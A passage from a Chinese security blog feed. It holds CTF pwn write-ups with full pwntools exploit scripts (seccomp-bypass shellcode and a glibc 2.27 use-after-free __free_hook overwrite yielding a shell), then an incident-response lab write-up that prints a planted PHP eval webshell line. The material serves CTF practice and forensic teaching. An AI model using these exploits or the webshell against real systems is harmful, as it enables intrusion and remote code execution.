0008</span><br><span class="line"> 0003: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0008</span><br><span class="line"> 0004: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>直接用openat+sendfile了，这题刚开始远程没有给pwn文件运行权限，后来也是公告刚发恰好看到，拿了个一血</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> p.sendline(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">delim, data</span>):</span><br><span class="line">    <span class="keyword">return</span> p.sendlineafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">    <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc64</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc32</span>():</span><br><span class="line">     <span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> (libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">  </span><br><span class="line">debug_mode = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug_mode:</span><br><span class="line">    p = remote(<span class="string">&#x27;192.168.20.213&#x27;</span>,<span class="number">46069</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line"></span><br><span class="line">sd = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    push SYS_openat</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, 3</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x100</span></span><br><span class="line"><span class="string">    push SYS_sendfile</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">s(sd)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h2 id="Simplest-pwn"><a href="#Simplest-pwn" class="headerlink" title="Simplest_pwn"></a>Simplest_pwn</h2><p>2.27的堆，明显的uaf，不能申请大堆块，先申请8个0x78，先拿libc，然后在tcachebins上申请出来free_hook，然后填入system，最后free一个binsh就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> input; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please tell me which chunk you want to delete:&quot;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  input = get_input();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)input &lt; <span class="number">0x10</span> &amp;&amp; *((_QWORD *)&amp;chunk_array + input) &amp;&amp; size_array[input] )</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;chunk_array + input));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> p.sendline(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">delim, data</span>):</span><br><span class="line">    <span class="keyword">return</span> p.sendlineafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">    <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc64</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc32</span>():</span><br><span class="line">     <span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> (libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/root/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">debug_mode = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug_mode:</span><br><span class="line">    p = remote(<span class="string">&#x27;192.168.20.213&#x27;</span>,<span class="number">46700</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,c</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">b&#x27; want:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    rl(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    s(c)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,c</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;edit:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    rl(<span class="string">b&#x27;content:\n&#x27;</span>)</span><br><span class="line">    s(c)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;delete:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;look:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x88</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = get_libc64() - <span class="number">0x3ebca0</span></span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system,binsh=get_sb()</span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+libc_base</span><br><span class="line">edit(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x88</span>,p64(system))</span><br><span class="line">li(<span class="built_in">hex</span>(system))</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h2 id="比赛题目附件链接"><a href="#比赛题目附件链接" class="headerlink" title="比赛题目附件链接"></a>比赛题目附件链接</h2><p>通过网盘分享的文件：2025御网杯线下赛<br>链接: <a href="https://pan.baidu.com/s/1NXhva6lt7S1yQgV03ZveOA?pwd=yhpd">https://pan.baidu.com/s/1NXhva6lt7S1yQgV03ZveOA?pwd=yhpd</a> 提取码: yhpd<br>–来自百度网盘超级会员v1的分享</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玄机-应急响应-vulntarget-b-01</title>
      <link href="/2025/07/07/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget-b-01/"/>
      <url>/2025/07/07/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget-b-01/</url>
      
        <content type="html"><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>1、黑客是从哪个端口作为入口点的<br>2、黑客使用了什么工具探测了ssh服务<br>3、黑客使用了什么工具扫描了目录（格式flag{工具&#x2F;版本号}）<br>4、黑客成功登录后台的IP地址？<br>5、黑客上传的木马连接密钥是什么？<br>6、黑客留下的后门文件的路径为？</p><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p>先看监听中的端口，然后在root目录下的install.sh中使用宝塔作为控制面板，然后可以看到默认开启端口，并且ngnix服务监听在两个端口上，可以发现81并不是默认开启的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-10-7 ~]# ss -lntup</span><br><span class="line">Netid  State      Recv-Q Send-Q            Local Address:Port                           Peer Address:Port</span><br><span class="line">udp    UNCONN     0      0                             *:68                                        *:*                   <span class="built_in">users</span>:((&quot;dhclient&quot;,pid=<span class="number">1046</span>,fd=<span class="number">6</span>))</span><br><span class="line">udp    UNCONN     0      0                     127.0.0.1:323                                       *:*                   <span class="built_in">users</span>:((&quot;chronyd&quot;,pid=<span class="number">645</span>,fd=<span class="number">5</span>))</span><br><span class="line">udp    UNCONN     0      0                         [::1]:323                                    [::]:*                   <span class="built_in">users</span>:((&quot;chronyd&quot;,pid=<span class="number">645</span>,fd=<span class="number">6</span>))</span><br><span class="line">tcp    LISTEN     0      128                           *:80                                        *:*                   <span class="built_in">users</span>:((&quot;nginx&quot;,pid=<span class="number">1749</span>,fd=<span class="number">10</span>),(&quot;nginx&quot;,pid=<span class="number">1742</span>,fd=<span class="number">10</span>))</span><br><span class="line">tcp    LISTEN     0      128                           *:81                                        *:*                   <span class="built_in">users</span>:((&quot;nginx&quot;,pid=<span class="number">1749</span>,fd=<span class="number">11</span>),(&quot;nginx&quot;,pid=<span class="number">1742</span>,fd=<span class="number">11</span>))</span><br><span class="line">tcp    LISTEN     0      9                             *:21                                        *:*                   <span class="built_in">users</span>:((&quot;pure-ftpd&quot;,pid=<span class="number">1729</span>,fd=<span class="number">4</span>))</span><br><span class="line">tcp    LISTEN     0      128                           *:8888                                      *:*                   <span class="built_in">users</span>:((&quot;BT-Panel&quot;,pid=<span class="number">2431</span>,fd=<span class="number">5</span>))</span><br><span class="line">tcp    LISTEN     0      128                           *:888                                       *:*                   <span class="built_in">users</span>:((&quot;nginx&quot;,pid=<span class="number">1749</span>,fd=<span class="number">9</span>),(&quot;nginx&quot;,pid=<span class="number">1742</span>,fd=<span class="number">9</span>))</span><br><span class="line">tcp    LISTEN     0      100                   127.0.0.1:25                                        *:*                   <span class="built_in">users</span>:((&quot;master&quot;,pid=<span class="number">1448</span>,fd=<span class="number">13</span>))</span><br><span class="line">tcp    LISTEN     0      128                           *:222                                       *:*                   <span class="built_in">users</span>:((&quot;sshd&quot;,pid=<span class="number">1495</span>,fd=<span class="number">3</span>))</span><br><span class="line">tcp    LISTEN     0      128                        [::]:3306                                   [::]:*                   <span class="built_in">users</span>:((&quot;mysqld&quot;,pid=<span class="number">2374</span>,fd=<span class="number">13</span>))</span><br><span class="line">tcp    LISTEN     0      9                          [::]:21                                     [::]:*                   <span class="built_in">users</span>:((&quot;pure-ftpd&quot;,pid=<span class="number">1729</span>,fd=<span class="number">5</span>))</span><br><span class="line">tcp    LISTEN     0      100                       [::1]:25                                     [::]:*                   <span class="built_in">users</span>:((&quot;master&quot;,pid=<span class="number">1448</span>,fd=<span class="number">14</span>))</span><br><span class="line">tcp    LISTEN     0      128                        [::]:222                                    [::]:*                   <span class="built_in">users</span>:((&quot;sshd&quot;,pid=<span class="number">1495</span>,fd=<span class="number">4</span>))</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport 20 -j ACCEPT</span><br><span class="line">                       iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport 21 -j ACCEPT</span><br><span class="line">                       iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT</span><br><span class="line">                       iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT</span><br><span class="line">                       iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT</span><br><span class="line">                       iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport <span class="variable">$&#123;panelPort&#125;</span> -j ACCEPT</span><br><span class="line">                       iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport <span class="variable">$&#123;sshPort&#125;</span> -j ACCEPT</span><br><span class="line">                       iptables -I INPUT -p tcp -m state --state NEW -m tcp --dport 39000:40000 -j ACCEPT</span><br><span class="line">                       <span class="comment">#iptables -I INPUT -p tcp -m state --state NEW -m udp --dport 39000:40000 -j ACCEPT</span></span><br><span class="line">                       iptables -A INPUT -p icmp --icmp-type any -j ACCEPT</span><br><span class="line">                       iptables -A INPUT -s localhost -d localhost -j ACCEPT</span><br><span class="line">                       iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">                       iptables -P INPUT DROP</span><br><span class="line">                       service iptables save</span><br><span class="line">                       sed -i <span class="string">&quot;s#IPTABLES_MODULES=\&quot;\&quot;#IPTABLES_MODULES=\&quot;ip_conntrack_netbios_ns ip_conntrack_ftp ip_nat_ftp\&quot;#&quot;</span> /etc/sysconfig/iptables-config</span><br><span class="line">                       iptables_status=$(service iptables status | grep <span class="string">&#x27;not running&#x27;</span>)</span><br><span class="line">                       <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$&#123;iptables_status&#125;</span>&quot;</span> == <span class="string">&#x27;&#x27;</span> ];<span class="keyword">then</span></span><br><span class="line">                               service iptables restart</span><br><span class="line">                       <span class="keyword">fi</span></span><br><span class="line">               <span class="keyword">else</span></span><br><span class="line">                       AliyunCheck=$(<span class="built_in">cat</span> /etc/redhat-release|grep <span class="string">&quot;Aliyun Linux&quot;</span>)</span><br><span class="line">                       [ <span class="string">&quot;<span class="variable">$&#123;AliyunCheck&#125;</span>&quot;</span> ] &amp;&amp; <span class="built_in">return</span></span><br><span class="line">                       yum install firewalld -y</span><br><span class="line">                       [ <span class="string">&quot;<span class="variable">$&#123;Centos8Check&#125;</span>&quot;</span> ] &amp;&amp; yum reinstall python3-six -y</span><br><span class="line">                       systemctl <span class="built_in">enable</span> firewalld</span><br><span class="line">                       systemctl start firewalld</span><br><span class="line">                       firewall-cmd --set-default-zone=public &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       firewall-cmd --permanent --zone=public --add-port=20/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       firewall-cmd --permanent --zone=public --add-port=21/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       firewall-cmd --permanent --zone=public --add-port=22/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       firewall-cmd --permanent --zone=public --add-port=80/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       firewall-cmd --permanent --zone=public --add-port=443/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       firewall-cmd --permanent --zone=public --add-port=<span class="variable">$&#123;panelPort&#125;</span>/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       firewall-cmd --permanent --zone=public --add-port=<span class="variable">$&#123;sshPort&#125;</span>/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       firewall-cmd --permanent --zone=public --add-port=39000-40000/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                       <span class="comment">#firewall-cmd --permanent --zone=public --add-port=39000-40000/udp &gt; /dev/null 2&gt;&amp;1</span></span><br><span class="line">                       firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>ss -lntup是用来查看当前系统中监听中的端口（sockets）及其相关信息。</p><ul><li>-l    只显示监听（listening）状态的端口</li><li>-n显示数字地址和端口（不解析域名和服务名）——更快更清晰</li><li>-t显示 TCP 协议的连接</li><li>-u显示 UDP 协议的连接</li><li>-p显示哪个进程在使用这个端口（需要 root 权限查看完整信息）<br>即flag{81}</li></ul><h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>在&#x2F;www&#x2F;wwwlogs发现网站日志access.log，打开后会发现很多来nmap的探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">192.168.83.128 - - [18/Nov/2024:22:15:23 +0800] <span class="string">&quot;GET /status.jsp HTTP/1.1&quot;</span> 404 146 <span class="string">&quot;-&quot;</span> <span class="string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span></span><br><span class="line">192.168.83.128 - - [18/Nov/2024:22:15:23 +0800] <span class="string">&quot;GET /tasktracker.jsp HTTP/1.1&quot;</span> 404 146 <span class="string">&quot;-&quot;</span> <span class="string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>即flag{nmap}</p><h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p>同样在&#x2F;www&#x2F;wwwlogs还有一个127.0.0.1.log，打开就会发现很多gobuster的扫目录的记录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">192.168.83.1 - - [19/Nov/2024:22:53:48 +0800] <span class="string">&quot;GET /~test HTTP/1.1&quot;</span> 404 479 <span class="string">&quot;-&quot;</span> <span class="string">&quot;gobuster/3.6&quot;</span></span><br><span class="line">192.168.83.1 - - [19/Nov/2024:22:53:48 +0800] <span class="string">&quot;GET /~tmp HTTP/1.1&quot;</span> 404 479 <span class="string">&quot;-&quot;</span> <span class="string">&quot;gobuster/3.6&quot;</span></span><br><span class="line">192.168.83.1 - - [19/Nov/2024:22:53:48 +0800] <span class="string">&quot;GET /~user HTTP/1.1&quot;</span> 404 479 <span class="string">&quot;-&quot;</span> <span class="string">&quot;gobuster/3.6&quot;</span></span><br><span class="line">192.168.83.1 - - [19/Nov/2024:22:53:48 +0800] <span class="string">&quot;GET /~webmaster HTTP/1.1&quot;</span> 404 479 <span class="string">&quot;-&quot;</span> <span class="string">&quot;gobuster/3.6&quot;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>即flag{gobuster&#x2F;3.6}</p><h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><p>成功登录后台的IP地址猜测应该是来自gobuster扫描的地址，他发送的是http请求。<br>flag{192.168.83.1}</p><h2 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h2><p>一般一句话木马应该存在于www目录的一个php文件里，能够被网站访问且解析php文件<br>最终在&#x2F;www&#x2F;wwwroot&#x2F;jizhi&#x2F;index.php中发现一句话木马，密码为Admin@@</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//定义项目模型文件目录</span><br><span class="line">define(&#x27;HOME_MODEL&#x27;,&#x27;m&#x27;);</span><br><span class="line"></span><br><span class="line">eval($_POST[&quot;Admin@@&quot;]);</span><br><span class="line"></span><br><span class="line">//定义项目默认方法</span><br><span class="line">define(&#x27;DefaultAction&#x27;,&#x27;jizhi&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag{Admin@@}</p><h2 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h2><p>最后要找黑客留下的后门文件，最终在&#x2F;tmp下发现一个index.elf的二进制文件。猜测应该是这个。<br>目前我还没找到咋把文件传下来，因为网络不通，这里后续更新。<br>看网上文章确实是这个文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-10-7 tmp]# ls</span><br><span class="line">index.elf               sess_371d72f4d9apvoh6q7o4e58qm4                                          vmware-root_672-2722828807</span><br><span class="line">last_files_set_mode.pl  sess_5g6h04hq3ihphgn3d28o4sr20a                                          